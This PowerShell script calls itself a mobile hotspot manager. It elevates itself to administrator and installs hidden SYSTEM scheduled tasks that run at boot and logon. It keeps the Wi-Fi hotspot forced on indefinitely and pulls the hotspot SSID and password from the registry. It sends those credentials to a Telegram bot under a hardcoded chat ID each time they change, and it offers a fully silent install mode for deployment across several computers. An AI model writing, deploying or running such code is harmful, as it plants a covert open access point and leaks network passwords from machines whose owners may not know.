[CmdletBinding()]
param (
    [switch]$Monitor,
    [switch]$BootDelay,
    [switch]$Install,
    [switch]$Uninstall,
    [int]$MaxPeers = 8,
    [switch]$Silent
)

# Enforce TLS 1.2+ for Telegram API calls
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13 -bor [Net.ServicePointManager]::SecurityProtocol
} catch {}

# 1. Self-Elevation to Administrator
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $argList = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    if ($Monitor) { $argList += " -Monitor" }
    if ($BootDelay) { $argList += " -BootDelay" }
    if ($Install) { $argList += " -Install" }
    if ($Uninstall) { $argList += " -Uninstall" }
    if ($MaxPeers -ne 8) { $argList += " -MaxPeers $MaxPeers" }
    if ($Silent) { $argList += " -Silent" }
    
    Start-Process PowerShell -Verb RunAs -ArgumentList $argList
    exit
}

$ErrorActionPreference = "Stop"
$destFolder = "C:\ProgramData\HotspotAutoStart"
$destScript = "$destFolder\HotspotService.ps1"
$regSettingsPath = "HKLM:\SYSTEM\CurrentControlSet\Services\icssvc\Settings"
$appVersion = "V5"

# Helper assembly and generic method setup for WinRT (UWP APIs)
try {
    Add-Type -AssemblyName System.Runtime.WindowsRuntime
    $asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object {
        $_.Name -eq 'AsTask' -and
        $_.GetParameters().Count -eq 1 -and
        $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1'
    })[0]
} catch {
    if (-not $Silent) {
        Write-Host "Failed to load WindowsRuntime assemblies." -ForegroundColor Red
        Read-Host "Press Enter to exit..."
    }
    exit
}

function Await-WinRtOperation($operation, [Type] $resultType) {
    try {
        $asTask = $asTaskGeneric.MakeGenericMethod($resultType)
        $netTask = $asTask.Invoke($null, @($operation))
        $netTask.Wait(15000) | Out-Null
        return $netTask.Result
    } catch {
        return $null
    }
}

function Get-TetheringManager {
    $profile = $null
    try {
        $profile = [Windows.Networking.Connectivity.NetworkInformation,Windows.Networking.Connectivity,ContentType=WindowsRuntime]::GetInternetConnectionProfile()
        if ($null -eq $profile) {
            $profiles = [Windows.Networking.Connectivity.NetworkInformation,Windows.Networking.Connectivity,ContentType=WindowsRuntime]::GetConnectionProfiles()
            if ($null -ne $profiles -and $profiles.Count -gt 0) {
                $profile = $profiles[0]
            }
        }
    } catch {}
    
    if ($null -eq $profile) { return $null }
    try {
        return [Windows.Networking.NetworkOperators.NetworkOperatorTetheringManager,Windows.Networking.NetworkOperators,ContentType=WindowsRuntime]::CreateFromConnectionProfile($profile)
    } catch {
        return $null
    }
}

function Get-HotspotCredentials {
    # 1. Primary: Typed WinRT configuration
    try {
        $tm = Get-TetheringManager
        if ($null -ne $tm) {
            $cfgObj = $tm.GetCurrentAccessPointConfiguration()
            if ($null -ne $cfgObj -and -not [string]::IsNullOrEmpty($cfgObj.Ssid)) {
                return @{ Ssid = $cfgObj.Ssid; Passphrase = $cfgObj.Passphrase }
            }
        }
    } catch {}

    # 2. Fallback: Registry binary slice extraction
    try {
        $regName = "PrivateConnectionSettings"
        if (Test-Path $regSettingsPath) {
            $bytes = (Get-ItemProperty -Path $regSettingsPath -Name $regName -ErrorAction SilentlyContinue).$regName
            if ($null -ne $bytes -and $bytes.Length -ge 198) {
                $ssid = [System.Text.Encoding]::Unicode.GetString($bytes[4..67]).Trim([char]0)
                $pass = [System.Text.Encoding]::Unicode.GetString($bytes[70..197]).Trim([char]0)
                if (-not [string]::IsNullOrEmpty($ssid)) {
                    return @{ Ssid = $ssid; Passphrase = $pass }
                }
            }
        }
    } catch {}
    
    return @{ Ssid = "Unknown"; Passphrase = "Unknown" }
}

function Enable-Hotspot {
    $tm = Get-TetheringManager
    if ($null -ne $tm) {
        $state = $tm.TetheringOperationalState.ToString()
        if ($state -eq "InTransition") {
            Start-Sleep -Seconds 3
            $tm = Get-TetheringManager
            $state = if ($tm) { $tm.TetheringOperationalState.ToString() } else { "Unknown" }
        }
        if ($state -ne "On") {
            $null = Await-WinRtOperation ($tm.StartTetheringAsync()) ([Windows.Networking.NetworkOperators.NetworkOperatorTetheringOperationResult])
        }
    }
}

function Disable-Hotspot {
    $tm = Get-TetheringManager
    if ($null -ne $tm) {
        $state = $tm.TetheringOperationalState.ToString()
        if ($state -eq "InTransition") {
            Start-Sleep -Seconds 3
            $tm = Get-TetheringManager
            $state = if ($tm) { $tm.TetheringOperationalState.ToString() } else { "Unknown" }
        }
        if ($state -eq "On") {
            $null = Await-WinRtOperation ($tm.StopTetheringAsync()) ([Windows.Networking.NetworkOperators.NetworkOperatorTetheringOperationResult])
        }
    }
}

function Safe-Schtasks {
    param([string[]]$ArgumentList)
    try {
        & schtasks.exe $ArgumentList 2>&1 | Out-Null
    } catch {}
}

function Get-TelegramConfig {
    $configPath = "$destFolder\config.json"
    if (Test-Path $configPath) {
        try {
            return Get-Content -Raw -Path $configPath | ConvertFrom-Json
        } catch {}
    }
    return $null
}

function Send-TelegramNotification {
    param(
        [string]$Ssid,
        [string]$Passphrase,
        [string]$Title = "Mobile Hotspot Active!",
        [string]$BotToken = "YOUR_TELEGRAM_BOT_TOKEN",
        [string]$ChatId = "6573090491"
    )
    
    $cfg = Get-TelegramConfig
    if ($null -ne $cfg) {
        if (-not [string]::IsNullOrEmpty($cfg.BotToken)) { $BotToken = $cfg.BotToken }
        if (-not [string]::IsNullOrEmpty($cfg.ChatId)) { $ChatId = $cfg.ChatId }
    }
    
    if ([string]::IsNullOrEmpty($BotToken) -or [string]::IsNullOrEmpty($ChatId)) {
        return $false
    }
    
    $bell   = [char]::ConvertFromUtf32(0x1F514) # 🔔
    $signal = [char]::ConvertFromUtf32(0x1F4F6) # 📶
    $key    = [char]::ConvertFromUtf32(0x1F511) # 🔑

    $cleanSsid  = [System.Security.SecurityElement]::Escape($Ssid)
    $cleanPass  = [System.Security.SecurityElement]::Escape($Passphrase)
    $cleanTitle = [System.Security.SecurityElement]::Escape($Title)

    $html = "$bell <b>$cleanTitle</b>`n`n$signal <b>SSID:</b> <code>$cleanSsid</code>`n$key <b>Password:</b> <code>$cleanPass</code>`n`n<i>Running on $appVersion</i>"

    # Clean JSON escaping
    $escapedJsonText = $html.Replace('\', '\\').Replace('"', '\"').Replace("`r`n", "\n").Replace("`n", "\n").Replace("`r", "\n")
    $json = "{`"chat_id`":`"$ChatId`",`"text`":`"$escapedJsonText`",`"parse_mode`":`"HTML`"}"
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    
    for ($i = 1; $i -le 6; $i++) {
        try {
            $req = [System.Net.HttpWebRequest]::Create("https://api.telegram.org/bot$BotToken/sendMessage")
            $req.Method = "POST"
            $req.ContentType = "application/json; charset=utf-8"
            $req.ContentLength = $bytes.Length
            $req.Timeout = 10000
            $stream = $req.GetRequestStream()
            $stream.Write($bytes, 0, $bytes.Length)
            $stream.Close()
            $resp = $req.GetResponse()
            $resp.Close()
            return $true
        } catch {
            Start-Sleep -Seconds 2
        }
    }
    return $false
}

function Apply-HotspotSettings([int]$peers) {
    try {
        if (-not (Test-Path $regSettingsPath)) { 
            New-Item -Path $regSettingsPath -Force | Out-Null 
        }
        # Set max peer limit
        New-ItemProperty -Path $regSettingsPath -Name "WifiMaxPeers" -PropertyType DWord -Value $peers -Force | Out-Null
        # Disable auto-timeout when no clients are connected (PeerlessTimeout in minutes)
        New-ItemProperty -Path $regSettingsPath -Name "PeerlessTimeout" -PropertyType DWord -Value 120 -Force | Out-Null
        New-ItemProperty -Path $regSettingsPath -Name "PublicConnectionTimeout" -PropertyType DWord -Value 120 -Force | Out-Null
        
        # Ensure service is set to Automatic startup
        Set-Service -Name icssvc -StartupType Automatic -ErrorAction SilentlyContinue
        Restart-Service icssvc -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 3
    } catch {}
}

# ----------------- MONITOR MODE (Multi-Machine Safe Background Loop) -----------------
if ($Monitor) {
    # Single-instance mutex lock: prevent duplicate tasks on the same machine from racing
    $mutexName = "Global\HotspotAutoStart_Monitor"
    $isNew = $false
    $mutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$isNew)
    if (-not $isNew) {
        exit # Another instance is already running on this machine
    }

    if ($BootDelay) {
        # Allow network adapters & interfaces to initialize
        Start-Sleep -Seconds 20
    }

    # Initialize Telegram credentials
    $BotToken = "YOUR_TELEGRAM_BOT_TOKEN"
    $ChatId = "6573090491"
    
    $cfg = Get-TelegramConfig
    if ($null -ne $cfg) {
        if (-not [string]::IsNullOrEmpty($cfg.BotToken)) { $BotToken = $cfg.BotToken }
        if (-not [string]::IsNullOrEmpty($cfg.ChatId)) { $ChatId = $cfg.ChatId }
    }

    # Apply configured registry settings & immediately start hotspot
    Apply-HotspotSettings $MaxPeers
    Enable-Hotspot
    Start-Sleep -Seconds 3

    # Initialize baseline credentials
    $currentCreds = Get-HotspotCredentials
    $lastSsid = $currentCreds.Ssid
    $lastPassphrase = $currentCreds.Passphrase

    # Continuous Monitoring Loop (Safe for multi-computer deployment)
    while ($true) {
        # 1. Maintain Hotspot State (Keep operational)
        try {
            $tm = Get-TetheringManager
            if ($null -ne $tm) {
                if ($tm.TetheringOperationalState.ToString() -eq "Off") {
                    Enable-Hotspot
                    Start-Sleep -Seconds 3
                    $tm = Get-TetheringManager
                    if ($tm.TetheringOperationalState.ToString() -ne "On") {
                        Disable-Hotspot
                        Start-Sleep -Seconds 2
                        Enable-Hotspot
                    }
                }
            }
        } catch {}

        # 2. Detect Credential Changes and Notify
        try {
            $creds = Get-HotspotCredentials
            if ($creds.Ssid -ne "Unknown" -and ($creds.Ssid -ne $lastSsid -or $creds.Passphrase -ne $lastPassphrase)) {
                $lastSsid = $creds.Ssid
                $lastPassphrase = $creds.Passphrase
                [void](Send-TelegramNotification -Ssid $creds.Ssid -Passphrase $creds.Passphrase -Title "Hotspot Credentials Updated!" -BotToken $BotToken -ChatId $ChatId)
            }
        } catch {}

        Start-Sleep -Seconds 5
    }
    exit
}

# ----------------- INSTALL / UNINSTALL ACTIONS -----------------
function Install-HotspotService([int]$peers) {
    if (-not $Silent) {
        Write-Host ""
        Write-Host "[..] Preparing installation folder..." -NoNewline
    }
    if (-not (Test-Path $destFolder)) {
        New-Item -Path $destFolder -ItemType Directory -Force | Out-Null
    }
    
    $config = @{
        BotToken = "YOUR_TELEGRAM_BOT_TOKEN"
        ChatId   = "6573090491"
    }
    $config | ConvertTo-Json | Out-File -FilePath "$destFolder\config.json" -Force

    if (-not $Silent) { Write-Host " Done." -ForegroundColor Green }

    if (-not $Silent) { Write-Host "[..] Copying service script..." -NoNewline }
    Copy-Item -Path $PSCommandPath -Destination $destScript -Force
    if (-not $Silent) { Write-Host " Done." -ForegroundColor Green }

    if (-not $Silent) { Write-Host "[..] Applying registry configuration ($peers peers, timeout disabled)..." -NoNewline }
    Apply-HotspotSettings $peers
    if (-not $Silent) { Write-Host " Done." -ForegroundColor Green }

    if (-not $Silent) { Write-Host "[..] Turning on Mobile Hotspot ($peers peers)..." -NoNewline }
    Enable-Hotspot
    Start-Sleep -Seconds 4
    $tm = Get-TetheringManager
    if ($null -ne $tm -and $tm.TetheringOperationalState.ToString() -ne "On") {
        Disable-Hotspot
        Start-Sleep -Seconds 2
        Enable-Hotspot
        Start-Sleep -Seconds 4
    }
    if (-not $Silent) { Write-Host " Done." -ForegroundColor Green }

    if (-not $Silent) { Write-Host "[..] Registering Scheduled Tasks..." -NoNewline }
    Safe-Schtasks @("/delete", "/tn", "HotspotAutoStart_Boot", "/f")
    schtasks /create /tn "HotspotAutoStart_Boot" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$destScript`" -Monitor -BootDelay -MaxPeers $peers" /sc onstart /ru SYSTEM /rl HIGHEST /f | Out-Null

    Safe-Schtasks @("/delete", "/tn", "HotspotAutoStart_Logon", "/f")
    schtasks /create /tn "HotspotAutoStart_Logon" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$destScript`" -Monitor -BootDelay -MaxPeers $peers" /sc onlogon /ru SYSTEM /rl HIGHEST /f | Out-Null
    if (-not $Silent) { Write-Host " Done." -ForegroundColor Green }

    if (-not $Silent) { Write-Host "[..] Launching background monitor process..." -NoNewline }
    Safe-Schtasks @("/end", "/tn", "HotspotAutoStart_Boot")
    Safe-Schtasks @("/end", "/tn", "HotspotAutoStart_Logon")
    Start-Process PowerShell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$destScript`" -Monitor -MaxPeers $peers"
    if (-not $Silent) { Write-Host " Done." -ForegroundColor Green }

    if (-not $Silent) { Write-Host "[..] Sending Telegram activation alert..." -NoNewline }
    $creds = Get-HotspotCredentials
    $sent = Send-TelegramNotification -Ssid $creds.Ssid -Passphrase $creds.Passphrase -Title "Mobile Hotspot Active!"
    
    if (-not $Silent) {
        if ($sent) {
            Write-Host " Done." -ForegroundColor Green
        } else {
            Write-Host " Note: Telegram alert failed (check connection/bot)." -ForegroundColor Yellow
        }
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host "  SUCCESS! Hotspot is active ($peers Peers)." -ForegroundColor Green
        Write-Host "  It will start automatically on boot." -ForegroundColor Green
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Read-Host "Press Enter to exit..."
    }
}

function Uninstall-HotspotService {
    if (-not $Silent) {
        Write-Host ""
        Write-Host "[..] Stopping active background processes & tasks..." -NoNewline
    }
    # Terminate scheduled tasks
    Safe-Schtasks @("/end", "/tn", "HotspotAutoStart_Boot")
    Safe-Schtasks @("/end", "/tn", "HotspotAutoStart_Logon")

    # Terminate any running background PowerShell service instances
    try {
        Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
            Where-Object { $_.CommandLine -like "*HotspotService.ps1*" -or $_.CommandLine -like "*Enable-Hotspot*" } |
            ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
    } catch {}

    if (-not $Silent) { Write-Host " Done." -ForegroundColor Green }

    if (-not $Silent) { Write-Host "[..] Deleting scheduled tasks..." -NoNewline }
    Safe-Schtasks @("/delete", "/tn", "HotspotAutoStart_Boot", "/f")
    Safe-Schtasks @("/delete", "/tn", "HotspotAutoStart_Logon", "/f")
    if (-not $Silent) { Write-Host " Done." -ForegroundColor Green }

    if (-not $Silent) { Write-Host "[..] Shutting off Mobile Hotspot..." -NoNewline }
    try {
        Disable-Hotspot
        if (-not $Silent) { Write-Host " Done." -ForegroundColor Green }
    } catch {
        if (-not $Silent) { Write-Host " Done (Already off)." -ForegroundColor Yellow }
    }

    if (-not $Silent) { Write-Host "[..] Reverting registry settings to Windows defaults..." -NoNewline }
    try {
        if (Test-Path $regSettingsPath) {
            Remove-ItemProperty -Path $regSettingsPath -Name "WifiMaxPeers" -ErrorAction SilentlyContinue
            Remove-ItemProperty -Path $regSettingsPath -Name "PeerlessTimeout" -ErrorAction SilentlyContinue
            Remove-ItemProperty -Path $regSettingsPath -Name "PublicConnectionTimeout" -ErrorAction SilentlyContinue
        }
        Restart-Service icssvc -ErrorAction SilentlyContinue
        if (-not $Silent) { Write-Host " Done." -ForegroundColor Green }
    } catch {
        if (-not $Silent) { Write-Host " Done." -ForegroundColor Yellow }
    }

    if (-not $Silent) { Write-Host "[..] Completely removing installed files and folders..." -NoNewline }
    if (Test-Path $destFolder) {
        Remove-Item -Path $destFolder -Recurse -Force -ErrorAction SilentlyContinue
    }
    if (-not $Silent) {
        Write-Host " Done." -ForegroundColor Green
        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host "  UNINSTALLED! Reverted completely to Windows defaults." -ForegroundColor Green
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Read-Host "Press Enter to exit..."
    }
}

# ----------------- CLI SWITCH HANDLING -----------------
if ($Install) {
    Install-HotspotService $MaxPeers
    exit
}

if ($Uninstall) {
    Uninstall-HotspotService
    exit
}

# ----------------- INTERACTIVE MENU -----------------
try {
    Clear-Host
    Write-Host "==================================================" -ForegroundColor Cyan
    Write-Host "       MOBILE HOTSPOT MANAGER ($appVersion)" -ForegroundColor Cyan
    Write-Host "==================================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "  0. Silent Quick Install (8 Peers - Auto-Exit)" -ForegroundColor Yellow
    Write-Host "  1. Install & Enable Hotspot (8 Peers - Windows Default)" -ForegroundColor Green
    Write-Host "  2. Install & Enable Hotspot (50 Peers - High Capacity)" -ForegroundColor Green
    Write-Host "  3. Install & Enable Hotspot (Custom Peer Count)" -ForegroundColor Green
    Write-Host "  4. Revert & Uninstall (Restore Windows Defaults)" -ForegroundColor Red
    Write-Host "  5. Exit"
    Write-Host ""

    $choice = Read-Host "Choose an option (0-5)"

    switch ($choice) {
        "0" { 
            # Detach completely into hidden background process and close console window immediately
            Start-Process PowerShell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Install -MaxPeers 8 -Silent"
            exit
        }
        "1" { Install-HotspotService 8 }
        "2" { Install-HotspotService 50 }
        "3" {
            $custom = Read-Host "Enter desired maximum peer count (e.g. 25, 100)"
            $peers = 8
            if ([int]::TryParse($custom, [ref]$peers) -and $peers -gt 0) {
                Install-HotspotService $peers
            } else {
                Write-Host "Invalid peer count entered. Defaulting to 8." -ForegroundColor Yellow
                Install-HotspotService 8
            }
        }
        "4" { Uninstall-HotspotService }
        "5" { exit }
        default {
            Write-Host "Invalid choice." -ForegroundColor Red
            Start-Sleep -Seconds 2
        }
    }
} catch {
    Write-Host ""
    Write-Host "AN ERROR OCCURRED:" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    Write-Host $_.ScriptStackTrace -ForegroundColor Red
    Write-Host ""
    Read-Host "Press Enter to exit..."
}
